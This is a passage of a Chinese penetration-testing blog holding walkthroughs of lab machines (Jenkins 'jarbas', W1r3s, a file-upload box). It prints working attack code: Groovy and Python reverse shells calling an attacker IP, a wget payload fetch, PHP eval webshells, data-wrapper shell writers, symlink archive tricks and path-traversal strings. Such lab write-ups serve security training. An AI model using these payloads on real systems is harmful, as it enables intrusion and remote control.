src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132611.png" alt="image.png"></p><blockquote><p>test1用来改变目录，删掉现有test文件，创建test目录用来写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132621.png" alt="image.png"></p><blockquote><p>依次上传test1、test2，最终在web路径下访问shell.php：</p></blockquote><blockquote><p>注意：上传完test1后其实并不会在旧上传目录下看到test，将test理解为管道较为合适<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132629.png" alt="image.png"></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132639.png" alt="image.png"></p><blockquote><p>成功rce，反弹shell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132649.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132656.png" alt="image.png"></p><blockquote><p>使用mkfifo反弹成功</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132717.png" alt="image.png"></p><blockquote><p>这里也可以看到test确实指向了网站根目录</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132731.png" alt="image.png"></p><blockquote><p>sudo枚举发现不需要密码就可以执行mv</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132738.png" alt="image.png"></p><h3 id="mv提权"><a href="#mv提权" class="headerlink" title="mv提权"></a>mv提权</h3><blockquote><p>由于<code>sudo mv</code>不需要密码，故将&#x2F;bin&#x2F;su移为&#x2F;bin&#x2F;mv，执行<code>sudo mv</code>即无密码执行<code>sudo su</code></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132757.png" alt="image.png"></p><h2 id="0x04-总结反思补足"><a href="#0x04-总结反思补足" class="headerlink" title="0x04 总结反思补足"></a>0x04 总结反思补足</h2><h3 id="文件上传软链接"><a href="#文件上传软链接" class="headerlink" title="文件上传软链接"></a>文件上传软链接</h3><blockquote><p>利用1. 任意文件读取<br>条件：知道绝对路径、(www-data) 有读权限</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132805.png" alt="image.png"></p><blockquote><p><code>zip --symlinks</code>和<code>tar czf</code>均可打包动态的软链接，上传被解压后访问可以像钩子把目标文件勾出来</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /flag getflag<br>tar czf getflag.tar.gz getflag<br>zip --symlinks getflag.zip getflag<br></code></pre></td></tr></table></figure><blockquote><p>利用2. 改变文件上传路径<br>条件：知道网站根目录绝对路径</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132814.png" alt="image.png"></p><blockquote><p>test1用来改变目录，删掉现有test文件，创建test目录用来写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132827.png" alt="image.png"></p><blockquote><p>依次上传test1、test2，最终在web路径下访问shell.php：</p></blockquote><blockquote><p>注意：上传完test1后其实并不会在旧上传目录下看到test，将test理解为管道较为合适<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132849.png" alt="image.png"></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132855.png" alt="image.png"></p><blockquote><p>在web路径下访问到了shell.php</p></blockquote><h3 id="sqlmap少用batch"><a href="#sqlmap少用batch" class="headerlink" title="sqlmap少用batch"></a>sqlmap少用batch</h3><blockquote><p>再次使用sqlmap跑了遍注入，去掉了batch参数，跑出来了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328132908.png" alt="image.png"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><ol><li>端口扫描：只扫到了web服务，且存在sql注入</li><li>web渗透：sql一句话进入系统后台，存在当前用户无法使用的文件上传功能，修改cookie成功越权；在找不到上传路径的情况下发现文件包含点，利用伪协议读出各文件，得知上传路径为家目录，但无权访问家目录下的shell；猜测原因为目录权限问题，结合提供了解压缩功能，上传软链接修改上传路径为web根目录，在新上传路径下访问到shell，蚁剑连接，尝试多种反弹shell语句，最终mkfifo反弹成功</li><li>提权：mv命令具有无需密码的sudo权限，将mv的执行文件替换为su的执行文件，执行sudo mv达到sudo su的提权效果</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub jarbas</title>
    <link href="/2024/03/27/jarbas/"/>
    <url>/2024/03/27/jarbas/</url>
    
    <content type="html"><![CDATA[<p>vulhub jarbas walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194449.png" alt="image.png"></p><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194458.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194516.png" alt="image.png"></p><blockquote><p>udp并无有效信息<br>详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194550.png" alt="image.png"></p><blockquote><p>扫到8080是jetty 9.4.z-snapshot：用于java web的servlet容器(类似tomcat)</p></blockquote><blockquote><p>脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194614.png" alt="image.png"></p><blockquote><p>扫到8080的robots.txt，大致确定本机主要考察web渗透</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194624.png" alt="image.png"></p><blockquote><p>80应该是个买东西的网页？有注册、查找功能，查找功能无效</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194630.png" alt="image.png"></p><blockquote><p>8080好像是jenkins的后台登录，jenkins好像是一个集成的开发平台，不是cms</p></blockquote><blockquote><p>我选择从80入手，目录爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194639.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194647.png" alt="image.png"></p><blockquote><p>给了三个creds，还说加密很安全</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194657.png" alt="image.png"></p><blockquote><p>全是md5，解密：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194705.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194937.png" alt="image.png"></p><blockquote><p>拿凭据第一件事先尝试ssh：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194946.png" alt="image.png"></p><blockquote><p>失败<br>回到主站，发现页面显示逻辑好像是通过f参数确定：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327194958.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195009.png" alt="image.png"></p><blockquote><p>没测出idor和注入，但是在该页面发现登录和文件上传功能，且上传功能要先登录<br>尝试用刚获取的凭据登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195028.png" alt="image.png"></p><blockquote><p>登录功能需要的是邮箱，只能转去尝试注册了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195037.png" alt="image.png"></p><blockquote><p>查看源码发现注册功能根本不能用</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195045.png" alt="image.png"></p><blockquote><p>登录功能确实可用，思路断了<br>只能转去看8080了，目录爆破的同时尝试用刚刚的凭据登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195101.png" alt="image.png"></p><blockquote><p>只有eder的凭据登录成功，目录爆破毫无结果，直接开始后台的渗透：</p></blockquote><h3 id="Jenkins后台渗透"><a href="#Jenkins后台渗透" class="headerlink" title="Jenkins后台渗透"></a>Jenkins后台渗透</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195131.png" alt="image.png"></p><blockquote><p>在“脚本命令行”功能中发现可以运行命令，提示说使用Groovy语法，google出简单语法，发现可以执行：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195143.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195203.png" alt="image.png"></p><blockquote><p>这里尝试了常规的rce使用的bash反弹，失败，甚至无法执行bash等shell命令，存疑！</p></blockquote><blockquote><p>常规rce反弹失败，直接从(<a href="https://forum.ywhack.com/shell.php)%E7%94%9F%E6%88%90Groovy%E8%AF%AD%E6%B3%95%E7%9A%84%E5%8F%8D%E5%BC%B9shell%EF%BC%9A">https://forum.ywhack.com/shell.php)生成Groovy语法的反弹shell：</a></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195212.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195223.png" alt="image.png"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Groovy">String host=<span class="hljs-string">&quot;10.10.10.128&quot;</span>;<br><span class="hljs-type">int</span> port=<span class="hljs-number">9999</span>;<br>String cmd=<span class="hljs-string">&quot;/bin/bash&quot;</span>;<br>Process p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-literal">true</span>).start();<br>Socket s=<span class="hljs-keyword">new</span> Socket(host,port);<br>InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();<br>OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-keyword">while</span>(!s.isClosed())<br>&#123;<span class="hljs-keyword">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so.write(pi.read());<span class="hljs-keyword">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so.write(pe.read());<br>    <span class="hljs-keyword">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-keyword">try</span><br>&#123;p.exitValue();<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br><br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195240.png" alt="image.png"></p><blockquote><p>拿到立足点jenkins用户的shell</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><blockquote><p>初步信息探查：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195250.png" alt="image.png"></p><blockquote><p>自动任务枚举：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195258.png" alt="image.png"></p><blockquote><p>有root运行的自动任务，且文件有777权限<br>不知道为什么起不了交互shell，只能用重定向的方法把反弹shell语句写入自动任务脚本了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195309.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195317.png" alt="image.png"></p><blockquote><p>拿到root flag</p></blockquote><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol><li>端口扫描：80 web服务、8080 Jenkins后台、22 ssh、3306 mysql</li><li>web渗透：从80隐藏页面拿到Jenkins登录凭据，使用Jenkins的脚本命令行实现getshell（其余多种攻击手法见下文）</li><li>提权：存在root身份的777权限的自动任务，修改后弹出root shell</li></ol><h2 id="0x05-Jenkins攻击向量总结"><a href="#0x05-Jenkins攻击向量总结" class="headerlink" title="0x05 Jenkins攻击向量总结"></a>0x05 Jenkins攻击向量总结</h2><h3 id="尝试拿配置文件"><a href="#尝试拿配置文件" class="headerlink" title="尝试拿配置文件"></a>尝试拿配置文件</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195336.png" alt="image.png"></p><h3 id="脚本命令行"><a href="#脚本命令行" class="headerlink" title="脚本命令行"></a>脚本命令行</h3><blockquote><ol><li>简单命令执行(注意该语句不可执行反弹shell)：</li></ol></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Groovy"><span class="hljs-string">&quot;whoami&quot;</span>.execute().text;<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195345.png" alt="image.png"></p><blockquote><ol start="2"><li>修改文件：</li></ol></blockquote><blockquote><p>以本靶机来说，在用上述简单命令执行语句发现系统存在自动任务提权时，即可通过直接在此处修改任务文件一步get rootshell</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195357.png" alt="image.png"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs groovy">java.nio.file.Files.write(java.nio.file.Paths.get(<span class="hljs-string">&quot;/etc/script/CleaningScript.sh&quot;</span>), <span class="hljs-string">&quot;\nbbb&quot;</span>.getBytes(), java.nio.file.StandardOpenOption.APPEND);<br><span class="hljs-string">&quot;cat /etc/script/CleaningScript.sh&quot;</span>.execute().text;<br></code></pre></td></tr></table></figure><blockquote><p>将APPEND替换为TRUNCATE_EXISTING可不用追加，直接覆盖</p></blockquote><blockquote><ol start="3"><li>创建新文件(写马)：</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195407.png" alt="image.png"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>).write(<span class="hljs-string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>有写权限时即可写入</p></blockquote><blockquote><ol start="4"><li>反弹shell：</li></ol></blockquote><blockquote><p>使用groovy语句反弹shell：</p></blockquote><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Groovy">String host=<span class="hljs-string">&quot;10.10.10.128&quot;</span>;<br><span class="hljs-type">int</span> port=<span class="hljs-number">9999</span>;<br>String cmd=<span class="hljs-string">&quot;/bin/bash&quot;</span>;<br>Process p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-literal">true</span>).start();<br>Socket s=<span class="hljs-keyword">new</span> Socket(host,port);<br>InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();<br>OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-keyword">while</span>(!s.isClosed())<br>&#123;<span class="hljs-keyword">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so.write(pi.read());<span class="hljs-keyword">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so.write(pe.read());<br>    <span class="hljs-keyword">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-keyword">try</span><br>&#123;p.exitValue();<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();<br><br></code></pre></td></tr></table></figure><blockquote><p>wget python文件反弹shell：</p></blockquote><blockquote><p>写python反弹脚本，wget到tmp下，再执行即可</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># This is a Python reverse shell script</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os;<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br>s.connect((<span class="hljs-string">&quot;10.10.10.128&quot;</span>,<span class="hljs-number">9999</span>));<br>os.dup2(s.fileno(),<span class="hljs-number">0</span>);<br>os.dup2(s.fileno(),<span class="hljs-number">1</span>);<br>os.dup2(s.fileno(),<span class="hljs-number">2</span>);<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-string">&quot;wget http://10.10.10.128:80/2.py -P /tmp/&quot;</span>.execute().text;<br><span class="hljs-string">&quot;cat /tmp/2.py&quot;</span>.execute().text ;<br><span class="hljs-comment">//&quot;python /tmp/2.py&quot;.execute().text ;</span><br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195629.png" alt="image.png"></p><blockquote><p>去掉注释符执行，拿到shell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195643.png" alt="image.png"></p><h3 id="新建任务"><a href="#新建任务" class="headerlink" title="新建任务"></a>新建任务</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195653.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195700.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195912.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327195950.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327200423.png" alt="image.png"><br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327200428.png" alt="image.png"></p><h3 id="公开漏洞利用"><a href="#公开漏洞利用" class="headerlink" title="公开漏洞利用"></a>公开漏洞利用</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327200449.png" alt="image.png"></p><blockquote><p>还有一个之前刚冲浪看到的新的CVE2024的RCE</p></blockquote><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.secpulse.com/archives/2166.html"># 知其一不知其二之Jenkins Hacking</a><br><a href="https://posts.careerengine.us/p/5ff2dba78a9c343551e94ea7"># Jenkins 漏洞利用</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub W1r3s1.0.1</title>
    <link href="/2024/03/27/W1r3s1.0.1/"/>
    <url>/2024/03/27/W1r3s1.0.1/</url>
    
    <content type="html"><![CDATA[<p>vulhub W1r3s1.0.1 walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191221.png" alt="image.png"></p><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191234.png" alt="image.png"></p><blockquote><p>排序： 80 web、21 ftp、3306 mysql、22 ssh</p></blockquote><blockquote><p>详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191327.png" alt="image.png"></p><blockquote><p>ubuntu、mysql、apache、ftp存在匿名访问，考虑把ftp优先级提前到web前</p></blockquote><blockquote><p>脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191344.png" alt="image.png"></p><blockquote><p>扫到了wordpress登录页面，先记下来<br>还是准备先从ftp渗透开始</p></blockquote><h2 id="0x02-ftp渗透"><a href="#0x02-ftp渗透" class="headerlink" title="0x02 ftp渗透"></a>0x02 ftp渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191353.png" alt="image.png"></p><blockquote><p>匿名空密码登录，换binary模式，发现三个目录，其中的文件都可读，全部get下来</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191413.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191434.png" alt="image.png"></p><blockquote><p>02.txt 好像有些信息，先存下两个字符串</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191442.png" alt="image.png"></p><blockquote><p>employee给了员工信息<br>worktodo说 <code>I don&#39;t think this is the way to root</code>，不知道它想表达什么<br>先去处理刚刚的两个字符串：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191450.png" alt="image.png"></p><blockquote><p>一个md5，一个base64，解码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191459.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191507.png" alt="image.png"></p><blockquote><p>虽然他说不是密码，但还是先存下来<br>ftp渗透暂时应该结束了，转入web渗透：</p></blockquote><h2 id="0x03-web渗透"><a href="#0x03-web渗透" class="headerlink" title="0x03 web渗透"></a>0x03 web渗透</h2><blockquote><p>刚刚看到了有wordpress，先跑起gobuster目录爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191520.png" alt="image.png"></p><blockquote><p>唯一的收获就是有admin后台，但是301了<br>再跑下dirb的：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191537.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191616.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191739.png" alt="image.png"></p><blockquote><p>收获只有uploads路径可以访问</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191801.png" alt="image.png"></p><blockquote><p>web页面又是熟悉的ubuntu默认页面，省了不少事<br>可以直接去看wordpress登录界面了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191838.png" alt="image.png"></p><blockquote><p>查看源码发现了好像是wordpress的版本4.9.24</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191849.png" alt="image.png"></p><blockquote><p>尝试sql注入，不管输什么都会报无法连接：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191859.png" alt="image.png"></p><blockquote><p>很奇怪，为什么是跳转到了localhost？看源码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191914.png" alt="image.png"></p><blockquote><p>果然是写死的跳转localhost<br>想了想好像也没有ssrf的点，突发奇想他的其他301页面可能也是这个逻辑，跳转到localhost，拿刚开始扫出来没管的administrator页面尝试：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191929.png" alt="image.png"></p><blockquote><p>一试发现是直接转到了另一个有效页面，居然能直接访问到管理页面<br>当时一看到管理页面是301就想当然的以为跳转的目标是登录界面，导致走了不少弯路<br>那么就顺着新线索往下走：</p></blockquote><h3 id="cms公开漏洞利用"><a href="#cms公开漏洞利用" class="headerlink" title="cms公开漏洞利用"></a>cms公开漏洞利用</h3><blockquote><p>该页面暴露了：php配置文件可写、php版本、可文件上传、cms为cuppa<br>点next前往下一个页面：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327191940.png" alt="image.png"></p><blockquote><p>暴露了：<br>mysql：root可能是空密码<br>管理员账户：admin@admin</p></blockquote><blockquote><p>尝试连接数据库：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192002.png" alt="image.png"></p><blockquote><p>尝试ssh：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192011.png" alt="image.png"></p><blockquote><p>没办法，接着next：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192018.png" alt="image.png"></p><blockquote><p>反复测注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192029.png" alt="image.png"></p><blockquote><p>毫无收获<br>虽然并未发现cuppa的版本，但也只能尝试一下公开漏洞利用了<br>(实在不行就只剩wordpress的孤公开漏洞利用这条路尝试了)</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192052.png" alt="image.png"></p><blockquote><p>在我们目前没有进到wordpress后台时，可能的利用只有25971(cuppa)和47690</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192102.png" alt="image.png"></p><blockquote><p>看文档好像是个未授权的洞，谷歌后发现也是需要登录后才可能的利用</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192111.png" alt="image.png"></p><blockquote><p>说这个页面写了可控的文件包含语句，尝试访问该页面：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192130.png" alt="image.png"></p><blockquote><p>没报404，有希望</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192139.png" alt="image.png"></p><blockquote><p>没包含到，但是因为是request接收，尝试同时传个post：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192146.png" alt="image.png"></p><h3 id="文件包含模糊测试"><a href="#文件包含模糊测试" class="headerlink" title="文件包含模糊测试"></a>文件包含模糊测试</h3><blockquote><p>包含成功了，尝试远程文件包含：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192157.png" alt="image.png"></p><blockquote><p>包含失败，应该是关掉了远程包含<br>尝试包含日志文件getshell：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192204.png" alt="image.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>error.log<br>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>error.log<br></code></pre></td></tr></table></figure><blockquote><p>测试了apache的几个常规日志路径，均失败<br>尝试data写马：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192230.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240327192239.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;hack.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[v])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br>data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<span 